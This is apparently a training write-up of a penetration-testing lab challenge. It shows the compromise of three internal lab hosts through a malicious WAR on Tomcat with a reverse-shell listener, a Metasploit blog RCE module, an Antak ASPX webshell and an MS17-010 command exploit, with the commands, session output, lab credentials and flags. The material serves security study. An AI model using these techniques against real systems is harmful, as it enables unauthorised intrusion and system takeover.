# 🏴️ Shells and Payloads - Challenge

> **Difficulty:** Medium | **OS:** Mixed (Windows + Linux) | **Platform:** CPTS — Shells & Payloads Module

!!! info "About this page"
    Challenge from the **Shells & Payloads** module (CPTS). Access via RDP to a
    foothold host already inside the internal network, from which three targets
    are attacked in sequence: a Windows server with Tomcat, a Linux server with
    a vulnerable PHP blog, and a second Windows server exploitable via
    EternalBlue.

!!! note "About the IPs"
    The public RDP IP used to access the foothold host changed between output
    blocks (`10.129.93.110`, `10.129.204.126`, `10.129.94.4`), likely due to lab
    resets during the study. The **internal** IPs (`172.16.1.x`) stayed stable
    throughout the exploitation. All outputs were kept exactly as they appeared
    in the terminal.

---

## 📋 General Information

| Field | Value |
|:------|:------|
| **Entry host** | `skills-foothold` (accessed via RDP) |
| **IP (RDP, variable)** | `10.129.93.110` / `10.129.204.126` / `10.129.94.4` |
| **Internal hosts** | `172.16.1.11` (shells-winsvr) · `172.16.1.12` (shells-nixsvr) · `172.16.1.13` (SHELLS-WINBLUE) |
| **OS** | Mixed — Windows (foothold, winsvr, winblue) and Linux (nixsvr) |
| **Difficulty** | Medium |
| **Platform / Module** | CPTS — Shells & Payloads |
| **Internal domain** | `inlanefreight.local` |
| **Date** | 07/08/2026 |
| **Status** | ✅ Finished |

!!! abstract "Objective"
    Starting from a foothold host on the internal network, gain access and
    capture the flags on the remaining hosts, using different shell/payload
    generation and delivery techniques (malicious WAR, authenticated RCE via
    Metasploit, ASPX webshell, and EternalBlue).

---

## 🔍 Initial Enumeration

### Credentials found on the entry host

Right after RDP access to `skills-foothold`, a file called `access-creds.txt`
on the desktop contained credentials for two internal services:

![access-creds.txt file with blog and Tomcat credentials](../img/shells-e-payloads-desafio/01-access-creds-rdp.png)

```text
to manage the blog:
- admin / admin123!@#  ( keep it simple for the new admins )

to manage Tomcat on apache
- tomcat / Tomcatadm

Change the passwords soon..
```

!!! success "Credentials obtained (foothold)"
    - **Blog admin:** `admin` / `admin123!@#`
    - **Tomcat manager:** `tomcat` / `Tomcatadm`

### Ports and Services Found (172.16.1.13)

```bash
sudo nmap -sV -sC -sS -Pn --disable-arp-ping 172.16.1.13
```

| Port | Service | Version / Banner |
|:------|:--------|:----------------|
| 80 | http | Microsoft IIS httpd 10.0 |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | Windows Server 2016 Standard 14393 microsoft-ds |

![Nmap result on 172.16.1.13 - part 1 (IIS, RPC, SMB)](../img/shells-e-payloads-desafio/08-nmap-172-16-1-13-parte1.png)
![Nmap result on 172.16.1.13 - part 2 (host SHELLS-WINBLUE, Windows Server 2016)](../img/shells-e-payloads-desafio/09-nmap-172-16-1-13-parte2.png)

### Findings

- [x] `access-creds.txt` on the foothold exposes **blog** and **Tomcat** credentials
- [x] IIS on `172.16.1.13` with **TRACE** enabled (`http-methods`) and exposed directory indexing
- [x] `smb-security-mode`: **message signing enabled but not required** — SMB signing not mandatory
- [x] `smb-os-discovery` reveals hostname **`SHELLS-WINBLUE`**, Windows Server 2016 Standard 14393 → candidate for MS17-010 (EternalBlue)

---

## 🎯 Techniques Used

| # | Technique | Where / How it was applied |
|:--|:--------|:-------------------------|
| 1 | RDP access with provided credentials | Foothold host `skills-foothold` |
| 2 | Malicious WAR payload via `msfvenom` + Tomcat Manager | Deploy with `tomcat`/`Tomcatadm` → shell on `shells-winsvr` |
| 3 | `nc` listener for reverse shell | Received the connection from `172.16.1.11` |
| 4 | Authenticated RCE via Metasploit (`multi/http/fbs_blog_rce`) | PHP blog at `blog.inlanefreight.local` (172.16.1.12), login `admin`/`admin123!@#` |
| 5 | Post-exploitation enumeration (vhosts, `/`, filesystem) | Meterpreter → shell on `shells-nixsvr` |
| 6 | ASPX webshell upload (Antak) via exposed IIS indexer | `172.16.1.13/uploads/antak.aspx` |
| 7 | EternalBlue exploitation (`auxiliary/admin/smb/ms17_010_command`) | `172.16.1.13` (SHELLS-WINBLUE) → command execution as SYSTEM |

---

## 🚀 Exploitation / Initial Access

### Entry Vector

| Field | Value |
|:------|:------|
| **Vector** | RDP to foothold host `skills-foothold` |
| **Tools** | FreeRDP, `nc`, `msfvenom`/`msfconsole`, browser |
| **Access obtained as** | `htb-student` (foothold) |

!!! warning "RDP credentials"
    The RDP login on `skills-foothold` was done with credentials provided by
    the challenge, but **they don't appear in the log/screenshot** — only the
    result of the access (user `htb-student`).

### Stage 1 — Tomcat (shells-winsvr): malicious WAR → reverse shell

Using the `tomcat`/`Tomcatadm` credentials, a WAR payload (`ROOT.war`) was
prepared and deployed to Tomcat Manager. An `nc` listener was opened on the
foothold and received the connection back:

```bash
nano ROOT.war
nc -lvnp 4444
```

```shell
listening on [any] 4444 ...
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.11] 49828
Microsoft Windows [Version 10.0.17763.2114]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>hostname
hostname
shells-winsvr

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>whoami
whoami
nt authority\local service
```

![Reverse shell obtained via malicious WAR on Tomcat (host shells-winsvr)](../img/shells-e-payloads-desafio/02-reverse-shell-tomcat-winsvr.png)

!!! success "Access — shells-winsvr"
    Reverse shell as `nt authority\local service` on `172.16.1.11`
    (`shells-winsvr`), received on listener `172.16.1.5:4444`.

### Stage 2 — Blog (shells-nixsvr): authenticated RCE via Metasploit

Adding `blog.inlanefreight.local` to `/etc/hosts` (→ `172.16.1.12`) and
logging in with `admin`/`admin123!@#`, a blog post pointed to an authenticated
Exploit-DB exploit:

![Blog post linking to the Exploit-DB exploit for the Facebook-styled blog](../img/shells-e-payloads-desafio/03-blog-post-link-exploit.png)

> *Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE)
> (Authenticated) (Metasploit)* — exploit-db.com/exploits/50064

```
msf6 exploit(multi/http/fbs_blog_rce) > exploit

[*] Got CSRF token: 34a61ef518
[*] Logging into the blog...
[+] Successfully logged in with admin
[+] Uploading shell...
[+] Shell uploaded as data/i/4EJ0.php
[+] Payload successfully triggered !
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444)

meterpreter > shell
whoami
www-data
```

![Exploitation via msfconsole (fbs_blog_rce) with meterpreter session and www-data shell](../img/shells-e-payloads-desafio/04-msf-fbs-blog-rce-shell.png)

Confirming the host:

```shell
hostnamectl
  Static hostname: shells-nixsvr
  Operating System: Ubuntu 20.04.3 LTS
  Kernel: Linux 5.4.0-88-generic
  Architecture: x86-64
```

![System information via hostnamectl (host shells-nixsvr, Ubuntu 20.04.3)](../img/shells-e-payloads-desafio/05-hostname-so-nixsvr.png)

!!! success "Access — shells-nixsvr"
    Shell as `www-data` on `172.16.1.12` (`shells-nixsvr`), via authenticated
    RCE on the PHP blog.

### Stage 3 — SHELLS-WINBLUE (172.16.1.13): IIS → Antak webshell

The IIS directory indexer was exposed, with `upload.aspx` available:

![Exposed IIS file indexer on 172.16.1.13 with upload.aspx](../img/shells-e-payloads-desafio/10-indexador-arquivos-iis.png)

An ASPX webshell (**Antak**) was uploaded via `upload.aspx`, giving interactive
access to PowerShell:

![Antak webshell running PowerShell (iis apppool\defaultapppool)](../img/shells-e-payloads-desafio/11-antak-webshell-powershell.png)

```
PS> whoami
iis apppool\defaultapppool
```

!!! warning "Attempt that did NOT progress"
    Access to `C:\Users\Administrator` from the Antak webshell (`iis
    apppool\defaultapppool`) is privileged — it wasn't possible to advance
    directly through that path.

### Stage 4 — SHELLS-WINBLUE: EternalBlue (MS17-010)

The `nmap` scan already indicated SMB signing was not mandatory, plus the
hostname `SHELLS-WINBLUE`, which prompted a search for EternalBlue modules in
`msfconsole`:

```
msf6 > search eternalblue
```

| # | Module | Rank |
|:--|:-------|:-----|
| 0 | `exploit/windows/smb/ms17_010_eternalblue` | average |
| 1 | `exploit/windows/smb/ms17_010_psexec` | normal |
| 2 | `auxiliary/admin/smb/ms17_010_command` | normal |
| 3 | `auxiliary/scanner/smb/smb_ms17_010` | normal |
| 4 | `exploit/windows/smb/smb_doublepulsar_rce` | great |

![EternalBlue modules available in msfconsole (ms17_010)](../img/shells-e-payloads-desafio/12-msf-modulos-eternalblue.png)

Using module `2` (`auxiliary/admin/smb/ms17_010_command`), with `RHOSTS
172.16.1.13` and the command `type C:\Users\Administrator\Desktop\Skills-flag.txt`:

```
msf6 auxiliary(admin/smb/ms17_010_command) > set RHOSTS 172.16.1.13
msf6 auxiliary(admin/smb/ms17_010_command) > set command type C:\Users\Administrator\Desktop\Skills-flag.txt
msf6 auxiliary(admin/smb/ms17_010_command) > exploit

[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
[*] 172.16.1.13:445 - Built a write-what-where primitive...
[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
[+] 172.16.1.13:445 - Command completed successfully!
[*] 172.16.1.13:445 - Output for "type C:\Users\Administrator\Desktop\Skills-flag.txt":

One-H0st-Down!
```

![ms17_010_command exploit executed successfully, final flag captured](../img/shells-e-payloads-desafio/13-eternalblue-exploit-flag-final.png)

!!! success "Access — SHELLS-WINBLUE"
    Command execution as **SYSTEM** via `ms17_010_command` (MS17-010
    write-what-where primitive), without needing an interactive shell.

---

## 🐚 Shell and Post-Access

### Enumeration on shells-nixsvr

With the `www-data` shell, internal vhosts and the filesystem were enumerated:

![Enumeration of internal vhosts and directories (admin, app, blog, dev, drupal.inlanefreight.local)](../img/shells-e-payloads-desafio/06-vhosts-e-diretorios.png)

```text
admin.inlanefreight.local
app.inlanefreight.local
blog.inlanefreight.local
dev.inlanefreight.local
drupal.inlanefreight.local
```

The flag was located at `customscripts/flag.txt`:

```shell
cd customscripts
ls
flag.txt
cat flag.txt
B1nD_Shells_r_cool
```

![Flag captured in customscripts/flag.txt (shells-nixsvr)](../img/shells-e-payloads-desafio/07-flag-nixsvr.png)

### Summary of access obtained

| Host | IP | Access | Method |
|:-----|:---|:-------|:-------|
| `skills-foothold` | `10.129.x.x` (RDP) | `htb-student` | RDP with provided credentials |
| `shells-winsvr` | `172.16.1.11` | `nt authority\local service` | Malicious WAR on Tomcat |
| `shells-nixsvr` | `172.16.1.12` | `www-data` | Authenticated RCE (`fbs_blog_rce`) |
| `SHELLS-WINBLUE` | `172.16.1.13` | `iis apppool\defaultapppool` → **SYSTEM** | Antak webshell → EternalBlue (`ms17_010_command`) |

---

## 🚩 Flags

- [x] Flag captured on `shells-nixsvr`
- [x] Flag captured on `SHELLS-WINBLUE`

| Flag | Location |
|:-----|:------|
| `B1nD_Shells_r_cool` | `customscripts/flag.txt` (shells-nixsvr, 172.16.1.12) |
| `One-H0st-Down!` | `C:\Users\Administrator\Desktop\Skills-flag.txt` (SHELLS-WINBLUE, 172.16.1.13) |

---

## 📖 Technical Summary

| Field | Value |
|:------|:------|
| **Root cause** | Plaintext credentials on the foothold (`access-creds.txt`) + unpatched vulnerable services (blog RCE, IIS with exposed upload, MS17-010) |
| **Attack chain** | RDP → `access-creds.txt` → WAR on Tomcat (shells-winsvr) **and** blog RCE via Metasploit (shells-nixsvr) → flag `B1nD_Shells_r_cool` → nmap on 172.16.1.13 → Antak webshell (IIS) → EternalBlue (`ms17_010_command`) → flag `One-H0st-Down!` |
| **Final access** | SYSTEM on `SHELLS-WINBLUE` via MS17-010; `www-data` on `shells-nixsvr` |

---

## 💡 Lessons Learned

- **What worked:** chaining a credentials file exposed on the foothold to
  compromise two different services (Tomcat Manager and PHP blog); using clues
  from `nmap` itself (a host named "Blue") to steer the search toward
  EternalBlue.
- **What slowed things down:** trying to advance from the Antak webshell with
  the low-privilege user `iis apppool\defaultapppool` — the right path was
  using SMB (MS17-010) to reach SYSTEM directly.
- **Commands to review later:** `msfvenom` for generating WAR payloads;
  Metasploit's `ms17_010_*` modules and the difference between them
  (`eternalblue` gives a full shell, `command` only runs a single command via
  write-what-where).
- **Techniques to study further:** always review credential files found right
  at initial access — they frequently open up multiple vectors on different
  hosts on the same internal network.
